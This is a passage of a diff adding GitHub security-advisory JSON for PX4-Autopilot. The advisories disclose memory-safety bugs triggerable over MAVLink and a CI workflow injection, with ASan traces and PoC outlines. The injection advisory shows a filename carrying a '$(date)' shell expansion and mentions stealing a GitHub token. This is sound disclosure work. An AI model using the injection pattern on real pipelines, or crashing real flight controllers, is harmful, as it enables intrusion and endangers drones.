fd fa fa fa fd fd fd fa fa fa\r\n  0x0c06800b4c90: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fd\r\n  0x0c06800b4ca0: fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd\r\n  0x0c06800b4cb0: fd fd fa fa fd fd fd fa fa fa fd fd fd fa fa fa\r\n=>0x0c06800b4cc0: fd[fd]fd fa fa fa 00 00 00 fa fa fa fa fa fa fa\r\n  0x0c06800b4cd0: fa fa fa fa fa fa fa fa fd fd fd fd fa fa fd fd\r\n  0x0c06800b4ce0: fd fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa\r\n  0x0c06800b4cf0: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c06800b4d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c06800b4d10: fa fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\n==909005==ABORTING\r\n\r\n### PoC\r\n$ make px4_sitl jmavsim PX4_ASAN=1\r\nLaunch PX4 SITL compiled with AddressSanitizer.\r\nConnect QGroundControl or simulate MAVLink heartbeat.\r\nRun this minimal PoC \r\n\r\nhttps://drive.google.com/file/d/1P-P8uCMlCO0tV8WZosIrh4AYsj_2ZDDj/view?usp=sharing\r\n\r\nDue to the nature of the race condition between MAVLink receiver and sender threads, this vulnerability may not trigger deterministically on every run. However, in our testing, the use-after-free can be reliably reproduced within a few attempts, especially when running the provided PoC multiple times in succession. This is consistent with typical race condition behavior and reinforces the need for proper synchronization in the affected code paths.\r\n\r\n### Impact\r\nThis vulnerability is classified as a heap use-after-free caused by a race condition between the MAVLink receiver and telemetry sender threads in PX4.\r\n\r\nThe issue is remotely triggerable via MAVLink SERIAL_CONTROL messages (ID 126), which can be sent by an external ground station or automated script.\r\nIt leads to undefined behavior, typically resulting in crashes, memory corruption, or non-deterministic behavior in the flight controller.\r\n-While we have not demonstrated full remote code execution (RCE), use-after-free bugs are often considered critical due to their potential exploitability in other contexts or under different memory conditions.\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-j5w2-w79c-mqrw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32724",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-13T21:31:24Z",
+    "published_at": "2026-03-13T20:04:55Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "< 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-416",
+        "name": "Use After Free"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-416"
+    ],
+    "credits": [
+      {
+        "login": "xz0x",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "xz0x",
+          "id": 180241905,
+          "node_id": "U_kgDOCr5F8Q",
+          "avatar_url": "https://avatars.githubusercontent.com/u/180241905?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/xz0x",
+          "html_url": "https://github.com/xz0x",
+          "followers_url": "https://api.github.com/users/xz0x/followers",
+          "following_url": "https://api.github.com/users/xz0x/following{/other_user}",
+          "gists_url": "https://api.github.com/users/xz0x/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/xz0x/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/xz0x/subscriptions",
+          "organizations_url": "https://api.github.com/users/xz0x/orgs",
+          "repos_url": "https://api.github.com/users/xz0x/repos",
+          "events_url": "https://api.github.com/users/xz0x/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/xz0x/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 6,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rfc7-3pxc-c68p",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-rfc7-3pxc-c68p",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-rfc7-3pxc-c68p",
+    "summary": "docs_flaw_checker.yml: code execution",
+    "description": "### Summary\r\nThe workflow docs_flaw_checker.yml is triggered by `pull_request_target` which allows limited write access to the repository. An attacker can execute code by creating a file like `docs/en/flying/$(date).md`.\r\n\r\n### Details\r\nHigh-level explanation: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/\r\n\r\nThe vulnerable step is `echo \"${{ steps.get_changed_markdown_english.outputs.all_changed_files }}\"`\r\nIf the output `all_changed_files` contains shell expansions, the workflow runner will pass them directly to `echo \"..\"`.\r\n\r\n### PoC\r\nThe PR #24585 shows how an attack could look like. The attacker was able exfiltrate the GitHub token during the run and create a review of the PR (on behalf of the github-actions bot).\r\n\r\n### Impact\r\nThe attacker can edit labels of PRs (e.g. _Admin: Merge after CI passes ✅_). As far as I could determine it is not possible to merge PRs or write to the main branch directly.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "bkueng",
+      "id": 281593,
+      "node_id": "MDQ6VXNlcjI4MTU5Mw==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/281593?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/bkueng",
+      "html_url": "https://github.com/bkueng",
+      "followers_url": "https://api.github.com/users/bkueng/followers",
+      "following_url": "https://api.github.com/users/bkueng/following{/other_user}",
+      "gists_url": "https://api.github.com/users/bkueng/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/bkueng/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/bkueng/subscriptions",
+      "organizations_url": "https://api.github.com/users/bkueng/orgs",
+      "repos_url": "https://api.github.com/users/bkueng/repos",
+      "events_url": "https://api.github.com/users/bkueng/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/bkueng/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-rfc7-3pxc-c68p",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-08-15T06:12:12Z",
+    "published_at": "2025-08-15T06:12:12Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "CI"
+        },
+        "vulnerable_version_range": "main",
+        "patched_versions": "main",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [],
+    "credits_detailed": [],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 5,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-97c4-68r9-96p5",
+    "cve_id": "CVE-2026-32743",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-97c4-68r9-96p5",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-97c4-68r9-96p5",
+    "summary": "MavlinkLogHandler sscanf stack buffer overflow via MAVLink log request",
+    "description": "## Summary\r\n\r\nStack buffer overflow in `MavlinkLogHandler` triggered via MAVLink log request. The `LogEntry.filepath` buffer is 60 bytes, but `sscanf` parses paths from the log list file with no width specifier, allowing a path longer than 60 characters to overflow the buffer.\r\n\r\n### Details\r\n\r\nIn `mavlink_log_handler.cpp`, the log list file is parsed with:\r\n\r\n  ```cpp\r\n  sscanf(line, \"%\" PRIu32 \" %\" PRIu32 \" %s\",\r\n         &entry.time_utc, &entry.size_bytes, entry.filepath);\r\n\r\n  entry.filepath is only 60 bytes. A log directory structure producing paths longer than 60 characters causes a stack buffer overflow when a GCS requests the log list via MAV_CMD_LOG_REQUEST_LIST.\r\n  ```\r\n\r\nAn attacker with MAVLink link access can trigger this by first creating deeply nested directories via MAVLink FTP, then requesting the log list.\r\n\r\n### Impact\r\n\r\nDenial of service. The flight controller MAVLink task crashes, losing telemetry and command capability.\r\n\r\n### Fix\r\n- Size `LogEntry.filepath` to `PX4_MAX_FILEPATH` (256 bytes)\r\n- Add `sscanf` width specifiers to prevent overflow\r\n- Add `static_assert` to enforce buffer size at compile time\r\n\r\n## Original Report Below\r\n```\r\n=================================================================\r\n==66954==ERROR: AddressSanitizer: stack-overflow on address 0x7fc2b854ffd0 (pc 0x7fc2bbe447d9 bp 0x7fc2b8550820 sp 0x7fc2b854ffc0 T121)\r\n    #0 0x7fc2bbe447d8 in __sanitizer::StackTrace::StackTrace(unsigned long const*, unsigned int) ../../../../src/libsanitizer/sanitizer_common/sanitizer_stacktrace.h:50\r\n    #1 0x7fc2bbe447d8 in __sanitizer::BufferedStackTrace::BufferedStackTrace() ../../../../src/libsanitizer/sanitizer_common/sanitizer_stacktrace.h:95\r\n    #2 0x7fc2bbe447d8 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144\r\n    #3 0x7fc2bb8a1f18 in __alloc_dir ../sysdeps/posix/opendir.c:118\r\n    #4 0x7fc2bb8a1f18 in opendir_tail ../sysdeps/posix/opendir.c:69\r\n    #5 0x7fc2bb8a1f18 in __opendir ../sysdeps/posix/opendir.c:92\r\n    #6 0x7fc2bbd86342 in __interceptor_opendir ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:3101\r\n    #7 0x560bb775d487 in MavlinkLogHandler::write_entries_to_file(_IO_FILE*, char const*) ../../src/modules/mavlink/mavlink_log_handler.cpp:429\r\n    #8 0x560bb775dadc in MavlinkLogHandler::create_log_list_file() ../../src/modules/mavlink/mavlink_log_handler.cpp:410\r\n    #9 0x560bb775dcf1 in MavlinkLogHandler::handle_log_request_list(__mavlink_message const*) ../../src/modules/mavlink/mavlink_log_handler.cpp:262\r\n    #10 0x560bb77636c0 in MavlinkLogHandler::handle_message(__mavlink_message const*) ../../src/modules/mavlink/mavlink_log_handler.cpp:98\r\n    #11 0x560bb7714cd1 in MavlinkReceiver::handle_message(__mavlink_message*) ../../src/modules/mavlink/mavlink_receiver.cpp:408\r\n    #12 0x560bb771644a in MavlinkReceiver::run() ../../src/modules/mavlink/mavlink_receiver.cpp:3293\r\n    #13 0x560bb771c11e in MavlinkReceiver::start_trampoline(void*) ../../src/modules/mavlink/mavlink_receiver.cpp:3575\r\n    #14 0x7fc2bbd12608 in start_thread /build/glibc-LcI20x/glibc-2.31/nptl/pthread_create.c:477\r\n    #15 0x7fc2bb8e3352 in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x11f352)\r\n\r\nSUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_stacktrace.h:50 in __sanitizer::StackTrace::StackTrace(unsigned long const*, unsigned int)\r\nThread T121 (mavlink_rcv_if0) created by T120 (mavlink_if0) here:\r\n    #0 0x7fc2bbd71815 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cc:208\r\n    #1 0x560bb7710915 in MavlinkReceiver::start() ../../src/modules/mavlink/mavlink_receiver.cpp:3560\r\n\r\nThread T120 (mavlink_if0) created by T119 here:\r\n    #0 0x7fc2bbd71815 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cc:208\r\n    #1 0x560bb7ca4e8f in px4_task_spawn_cmd ../../platforms/posix/src/px4/common/tasks.cpp:246\r\n\r\nThread T119 created by T1 here:\r\n    #0 0x7fc2bbd71815 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cc:208\r\n    #1 0x560bb7cbe7bc in px4_daemon::Server::_server_main() ../../platforms/posix/src/px4/common/px4_daemon/server.cpp:185\r\n\r\nThread T1 created by T0 (px4) here:\r\n    #0 0x7fc2bbd71815 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cc:208\r\n    #1 0x560bb7cba53c in px4_daemon::Server::start() ../../platforms/posix/src/px4/common/px4_daemon/server.cpp:106\r\n    #2 0x7fc2bb9d26cf  (<unknown module>)\r\n\r\n==66954==ABORTING\r\n```\r\n\r\n### PoC\r\n1、Use the following command to start px4\r\nsudo make px4_sitl jmavsim PX4_ASAN=1\r\n2、Use the python code to send the mavlink message to the px4\r\n\r\n### Impact\r\nIf we can create a MAVLINK message remotely and send it to PX4, a global buffer overflow vulnerability will be triggered, causing the drone to behave unexpectedly.\r\n\r\nError report\r\n![QQ图片20241223112515](https://github.com/user-attachments/assets/b47c4987-8c9c-467f-82ef-f0a80b19f839)\r\n\r\n\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-97c4-68r9-96p5",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32743",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-16T17:34:01Z",
+    "published_at": "2026-03-14T01:08:39Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "main",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-121",
+        "name": "Stack-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-121"
+    ],
+    "credits": [
+      {
+        "login": "zhangteng0526",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "zhangteng0526",
+          "id": 49060609,
+          "node_id": "MDQ6VXNlcjQ5MDYwNjA5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/49060609?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/zhangteng0526",
+          "html_url": "https://github.com/zhangteng0526",
+          "followers_url": "https://api.github.com/users/zhangteng0526/followers",
+          "following_url": "https://api.github.com/users/zhangteng0526/following{/other_user}",
+          "gists_url": "https://api.github.com/users/zhangteng0526/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/zhangteng0526/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/zhangteng0526/subscriptions",
+          "organizations_url": "https://api.github.com/users/zhangteng0526/orgs",
+          "repos_url": "https://api.github.com/users/zhangteng0526/repos",
+          "events_url": "https://api.github.com/users/zhangteng0526/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/zhangteng0526/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-55wq-2hgm-75m4",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-55wq-2hgm-75m4",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-55wq-2hgm-75m4",
+    "summary": "There is a stack-buffer overflow vulnerability in the mavlink_receiver.cpp,which can cause the program to refuse to execute",
+    "description": "### Summary\r\nDue to the lack of judgment on the size of serial_control_mavlink.count and serial_control_mavlink.data, we found a stack buffer overflow vulnerability in mavlink_receiver.cpp. This will cause the drone to refuse to execute during software simulation.\r\n\r\n### Details\r\n\r\n1. Send a MAVLINK message to the drone. It will enter In mavlink_receiver.cpp, parse according to the specific MAVLINK received.\r\n2. When the type of message sent is MAVLINK_MSG_ID_SERIAL_CONTROL, the handle_message_serial_control function is executed\r\nhttps://github.com/PX4/PX4-Autopilot/blob/main/src/modules/mavlink/mavlink_receiver.cpp#L1798-L1831\r\n3. https://github.com/PX4/PX4-Autopilot/blob/main/src/modules/mavlink/mavlink_receiver.cpp#L1821-L1824\r\nWhen serial_control_mavlink.count > sizeof(serial_control_mavlink.data), a stack overflow vulnerability is triggered. This causes the program to crash and cause a denial of service.\r\n\r\n### Error report\r\n=================================================================\r\n==28263==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f1e57f6e4c4 at pc 0x7f1e5b7a8eed bp 0x7f1e57f6e420 sp 0x7f1e57f6dbc8\r\nREAD of size 216 at 0x7f1e57f6e4c4 thread T106 (mavlink_rcv_if0)\r\nAddressSanitizer:DEADLYSIGNAL\r\nAddressSanitizer: nested bug in the same thread, aborting.\r\n\r\nINFO [mavlink] Starting mavlink shell\r\n==34278== Thread 20 mavlink_rcv_if0:\r\n==34278== Syscall param write(buf) points to uninitialised byte(s)\r\n==34278== at 0x488B32F: __libc_write (write.c:26)\r\n==34278== by 0x488B32F: write (write.c:24)\r\n==34278== by 0x294A51: MavlinkReceiver::handle_message_serial_control(__mavlink_message*) (mavlink_receiver.cpp:1823)\r\n==34278== by 0x29C44A: MavlinkReceiver::handle_message(__mavlink_message*) (mavlink_receiver.cpp:240)\r\n==34278== by 0x29CA3E: MavlinkReceiver::run() (mavlink_receiver.cpp:3170)\r\n==34278== by 0x29E70C: MavlinkReceiver::start_trampoline(void*) (mavlink_receiver.cpp:3449)\r\n==34278== by 0x4880608: start_thread (pthread_create.c:477)\r\n==34278== by 0x4D0E352: clone (clone.S:95)\r\n==34278== Address 0x6adbf81 is on thread 20's stack\r\n==34278== in frame https://github.com/PX4/PX4-Autopilot/issues/1, created by MavlinkReceiver::handle_message_serial_control(__mavlink_message*) (mavlink_receiver.cpp:1799)\r\n==34278==\r\nINFO [mavlink] Stopping mavlink shell\r\n\r\n\r\n### PoC\r\n1、Use the following command to start px4\r\n`sudo make px4_sitl jmavsim PX4_ASAN=1`\r\n2、Use the python code and output.txt I provided to send the mavlink message to the px4 (Python code and output.txt are in the github repository)\r\n[https://github.com/zhangteng0526/px4_stack-over-flow](url)\r\n`python3.8 poc.py`\r\n\r\n### Impact\r\nIf we can create a MAVLINK message remotely and send it to PX4, a global buffer overflow vulnerability will be triggered, causing the drone to behave unexpectedly.\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "bkueng",
+      "id": 281593,
+      "node_id": "MDQ6VXNlcjI4MTU5Mw==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/281593?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/bkueng",
+      "html_url": "https://github.com/bkueng",
+      "followers_url": "https://api.github.com/users/bkueng/followers",
+      "following_url": "https://api.github.com/users/bkueng/following{/other_user}",
+      "gists_url": "https://api.github.com/users/bkueng/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/bkueng/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/bkueng/subscriptions",
+      "organizations_url": "https://api.github.com/users/bkueng/orgs",
+      "repos_url": "https://api.github.com/users/bkueng/repos",
+      "events_url": "https://api.github.com/users/bkueng/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/bkueng/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-55wq-2hgm-75m4",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-07-03T06:12:03Z",
+    "published_at": "2024-07-03T06:12:03Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "ubuntu",
+          "name": ""
+        },
+        "vulnerable_version_range": "<v.1.14.3",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:H",
+        "score": 7.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-121",
+        "name": "Stack-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-121"
+    ],
+    "credits": [
+      {
+        "login": "zhangteng0526",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "zhangteng0526",
+          "id": 49060609,
+          "node_id": "MDQ6VXNlcjQ5MDYwNjA5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/49060609?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/zhangteng0526",
+          "html_url": "https://github.com/zhangteng0526",
+          "followers_url": "https://api.github.com/users/zhangteng0526/followers",
+          "following_url": "https://api.github.com/users/zhangteng0526/following{/other_user}",
+          "gists_url": "https://api.github.com/users/zhangteng0526/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/zhangteng0526/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/zhangteng0526/subscriptions",
+          "organizations_url": "https://api.github.com/users/zhangteng0526/orgs",
+          "repos_url": "https://api.github.com/users/zhangteng0526/repos",
+          "events_url": "https://api.github.com/users/zhangteng0526/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/zhangteng0526/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 11,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:H",
+      "score": 7.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-p74g-gvg5-6pgc",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-p74g-gvg5-6pgc",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-p74g-gvg5-6pgc",
+    "summary": "[REPORT]Multi-Threaded Race Condition bug found in src/modules/navigator/geofence.cpp cause MissionFeasibilityChecker useless",
+    "description": "### Summary\r\nDue to the lack of synchronization mechanism for loading geofence data,we identified a Race Condition vulnerability in the geofence.cpp and mission_feasibility_checker.cpp.This will result in the drone uploading overlapping geofences and mission routes.But, as expected, MissionFeasibilityChecker should prevent the uploading.\r\n\r\n### Details\r\n\r\n1. When the ground control station upload mission or geofence to the drone.In geofence.cpp, there is a state machine designed to read geofence data from ourb and load it onto the drone, as illustrated in the following picture.\r\n   <p align=\"center\">\r\n     <img src=\"https://user-images.githubusercontent.com/151698793/294857321-53c6d894-448a-4130-85ae-30ab7e12e171.png\" width=\"622\" />\r\n   </p>\r\n   This functionality is called within a while(1) loop in navigator_main.cpp.\r\n\r\n   https://github.com/PX4/PX4-Autopilot/blob/cf840ff3731d8bebf65e79bd8c9c7bbd8d29d404/src/modules/navigator/navigator_main.cpp#L893  \r\nThe read and load operations within it utilize **asynchronous** reading, ensuring that they do not block the function loop.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/cf840ff3731d8bebf65e79bd8c9c7bbd8d29d404/src/modules/navigator/geofence.cpp#L111-L112\r\nhttps://github.com/PX4/PX4-Autopilot/blob/cf840ff3731d8bebf65e79bd8c9c7bbd8d29d404/src/modules/navigator/geofence.cpp#L155-L163\r\n \r\n2. When the ground control station upload mission or geofence to the drone.In mission_feasibility_checker.cpp, **synchronous** reading is employed to retrieve updates for the mission, and to check for potential conflicts between the mission and geofence.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/20129e63facab129ad31fa693d1397e7458afaa4/src/modules/navigator/mission_feasibility_checker.cpp#L122-L123\r\nThis functionality is called within a while(1) loop in navigator_main.cpp too.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/20129e63facab129ad31fa693d1397e7458afaa4/src/modules/navigator/navigator_main.cpp#L873-L877\r\n\r\n3. This is the cause of the issue. When on the ground control station, both the geofence and mission are updated simultaneously. The geofence undergoes multiple state transitions through the state machine (with each state transition requiring the execution of a while(1) loop), and it is only after asynchronous reading that the geofence data can be loaded for the mission_feasibility_checker to examine.\r\nTherefore, when the mission_feasibility_checker utilizes synchronous reading to obtain mission data, the geofence data involved in the check has not yet been updated. Consequently, the check is performed with outdated geofence data, resulting in the failure of the checker.\r\n\r\n\r\n### Verification\r\nI added some debug output to watch the drone's geofence data update.\r\n\r\nWe have observed that, after clicking \"UPLOAD\" in QGC, the updating of the geofence lags behind the mission updates and feasibility_check by several rounds in the loop.\r\n\r\nWhen the drone is executing a mission and the user clicks UPLOAD,the console will output the following content:\r\n\r\n```\r\n...\r\nINFO  [navigator] loop\r\nINFO  [navigator] loop\r\nINFO  [navigator] update mission    //load the new mission data\r\nINFO  [navigator] loop\r\nINFO  [navigator] check feasibility   //triger check function\r\nINFO  [navigator] loop   \r\nINFO  [navigator] loop             \r\nINFO  [navigator] loop   \r\nINFO  [navigator] loop   \r\nINFO  [navigator] update geofence  //Here load geofence data,but the feasibility checking has finshed\r\nINFO  [navigator] loop\r\nINFO  [navigator] loop\r\n...\r\n```\r\n### Temporary Patch\r\n\r\nNow, the check function is only present in the mission module. This is unreasonable.\r\n\r\nWhen GCS update the geofence, we need the mission feasibility checks to be run immediately.\r\n\r\nWe can accomplish the above by simply adding the same check to the geofence.Like this:Add mission point check when update the geofence #22531\r\n\r\nIn the main branch now, someone noticed the potential issue with this checker's effectiveness. However, their solution is to perform the check again just before the drone takes off. This can address some problems since, after some time, the geofence data is updated to the latest. However, they did not recognize that the fundamental cause of the issue is data race due to multithreading, and this approach introduces new problems. We and the contributor discussed this in [#1261](https://github.com/PX4/PX4-Autopilot/pull/22394#issuecomment-1858063715).\r\n\r\n>Currently, the same upload button doesn't trigger a check when updating only the fence, only updating the mission triggers a check, which I think is patently unreasonable.\r\n>For example, a scenario like this: a user plans a task in advance and passes the check, is ready to execute it some time later, but doesn't get a notification that the task is not compliant until just before execution.\r\n\r\n### Impact\r\n- Due to multiple threads accessing the geofence data, checher 